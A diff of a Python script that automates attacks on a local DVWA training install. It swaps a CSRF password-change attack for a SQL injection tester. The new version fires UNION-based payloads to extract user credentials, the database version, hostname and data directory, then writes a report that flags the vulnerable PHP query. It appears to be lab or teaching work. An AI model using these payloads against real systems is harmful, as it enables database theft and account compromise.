@@ -1,17 +1,27 @@
 import requests
 from bs4 import BeautifulSoup
+import os
 
 # Configuration
 DVWA_URL = 'http://localhost/dvwa/'
 LOGIN_URL = 'http://localhost/dvwa/login.php'
-CSRF_VULN_URL = 'http://localhost/dvwa/vulnerabilities/csrf/'
-REPORT_FILE = 'csrf_vulnerability_report.txt'
+VULN_URL = 'http://localhost/dvwa/vulnerabilities/sqli/'
+REPORT_FILE = 'sqlinjectionreport.txt'
+DVWA_PATH = r'C:\xampp\htdocs\dvwa\vulnerabilities\sqli\source\low.php'  # Update this to your actual DVWA installation path
 
 # DVWA Credentials
 USERNAME = 'admin'
-PASSWORD = 'password'
-NEW_PASSWORD = 'newpassword123'
+PASSWORD = 'admin'
 
+# Function to perform SQL injection and retrieve data
+def perform_sql_injection(session, payload):
+    target_url = f'{VULN_URL}?id={payload}&Submit=Submit'
+    response = session.get(target_url)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    extracted_data = soup.find_all('pre')
+    return target_url, [data.text.strip() for data in extracted_data]
+
+# Function to login to DVWA and retrieve CSRF token
 def login_to_dvwa():
     session = requests.Session()
     login_page = session.get(LOGIN_URL)
@@ -24,6 +34,9 @@ def login_to_dvwa():
         print('CSRF token not found in the login page HTML')
         return None
 
+    # Debugging: Print CSRF token
+    print(f'CSRF Token: {csrf_token}')
+
     # Login data
     login_data = {
         'username': USERNAME,
@@ -34,48 +47,66 @@ def login_to_dvwa():
 
     # Perform login
     response = session.post(LOGIN_URL, data=login_data)
-    
+
+    # Debugging: Print login response
+    print(f'Login response status: {response.status_code}')
+    print(response.text)
+
     if 'Login failed' in response.text:
         print('Login failed')
         return None
     
     return session
 
-def perform_csrf_attack(session, url, form_data):
-    # Get the page content
-    response = session.get(url)
-    soup = BeautifulSoup(response.content, 'html.parser')
-    
-    # Extract CSRF token
-    csrf_token = soup.find('input', {'name': 'user_token'})['value'] if soup.find('input', {'name': 'user_token'}) else None
+# Function to read the vulnerable PHP file and extract SQL vulnerable code
+def extract_vulnerable_sql_code(file_path):
+    vulnerable_lines = []
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+        for i, line in enumerate(lines, start=1):
+            if "SELECT" in line and "FROM users" in line and "WHERE user_id = '$id'" in line:
+                vulnerable_lines.append((i, line.strip()))
+    return vulnerable_lines
 
-    if not csrf_token:
-        print(f'CSRF token not found in {url}')
-        return url, 'CSRF token not found', False
-
-    # Add CSRF token to form data
-    form_data['user_token'] = csrf_token
-
-    # Perform the CSRF attack
-    response = session.post(url, data=form_data)
-    
-    if 'CSRF token is incorrect' in response.text or 'password is incorrect' in response.text:
-        return url, 'CSRF token is incorrect or operation failed', False
-    else:
-        return url, 'CSRF attack successful', True
-
-def write_report(results):
+# Function to write report
+def write_report(results, vulnerable_code):
     with open(REPORT_FILE, 'w') as report_file:
-        report_file.write('DVWA CSRF Vulnerability Report\n')
+        report_file.write('DVWA SQL Injection Vulnerability Report\n')
         report_file.write('='*40 + '\n')
 
-        for url, (test_scenario, success) in results.items():
-            report_file.write(f'Target URL: {url}\n')
-            report_file.write(f'Test Scenario: {test_scenario}\n')
-            report_file.write(f'Success: {success}\n')
+        for payload, (target_url, extracted_data) in results.items():
+            report_file.write(f'Test Payload: {payload}\n')
+            report_file.write(f'Target URL: {target_url}\n\n')
+
+            if extracted_data:
+                report_file.write('Extracted Data:\n')
+                for data in extracted_data:
+                    report_file.write(data.strip() + '\n\n')
+                report_file.write('Explanation:\n')
+                report_file.write('The SQL Injection vulnerability is present because the application does not properly sanitize user inputs.\n')
+                report_file.write('This allows an attacker to manipulate the SQL query by injecting malicious payloads.\n')
+                report_file.write('The presence of extracted data suggests that the SQL query is vulnerable to manipulation, as the database is returning information based on the injected payload.\n')
+                report_file.write(f'Vulnerable File URL: {target_url}\n')
+            else:
+                report_file.write('No data extracted, which might indicate a vulnerability or an issue with the payload.\n')
+                report_file.write('Explanation:\n')
+                report_file.write('The absence of extracted data suggests that the SQL query might still be vulnerable to manipulation, but the payload may need adjustments or the application might have mitigations in place.\n')
+                report_file.write(f'Vulnerable File URL: {target_url}\n')
+
             report_file.write('='*40 + '\n\n')
 
-def run_csrf_vulnerability_tests():
+        # Append the vulnerable PHP code with line numbers
+        report_file.write('Vulnerable SQL Code in PHP File:\n')
+        report_file.write('='*40 + '\n')
+
+        for line_number, code_line in vulnerable_code:
+            report_file.write(f'Line {line_number}: {code_line}\n')
+            report_file.write('Reason: SQL Injection vulnerability. The user input is directly incorporated into the SQL query without proper sanitization or parameterization.\n')
+
+        report_file.write('='*40 + '\n')
+
+# Main function to run the SQL injection tests
+def run_sql_injection_tests():
     session = login_to_dvwa()
 
     if not session:
@@ -83,22 +114,30 @@ def run_csrf_vulnerability_tests():
 
     results = {}
 
-    # CSRF attack scenarios
-    csrf_attack_scenarios = [
-        {'url': CSRF_VULN_URL, 'data': {'password_current': '', 'password_new': NEW_PASSWORD, 'password_conf': NEW_PASSWORD}},
-        # You can add more scenarios with different form data as needed
+    # SQL Injection payloads
+    payloads = [
+        "' OR '' = '",
+        "' UNION SELECT user, password FROM users--",
+        "' union select 1,@@version#",
+        "' union select null,@@hostname #",
+        "' union all select system_user(),user() #",
+        "' union select null,database() #",
+        "' union select null,@@datadir #"
     ]
 
-    for scenario in csrf_attack_scenarios:
-        url = scenario['url']
-        form_data = scenario['data']
-        target_url, test_scenario, success = perform_csrf_attack(session, url, form_data)
-        results[url] = (test_scenario, success)
+    for payload in payloads:
+        print(f'Testing payload: {payload}')
+        target_url, extracted_data = perform_sql_injection(session, payload)
+        results[payload] = (target_url, extracted_data)
 
     session.close()
-    write_report(results)
+
+    # Extract vulnerable SQL code from the PHP file
+    vulnerable_code = extract_vulnerable_sql_code(DVWA_PATH)
+
+    write_report(results, vulnerable_code)
     print(f'Report generated: {REPORT_FILE}')
 
 # Entry point of the script
 if __name__ == '__main__':
-    run_csrf_vulnerability_tests()
+    run_sql_injection_tests()
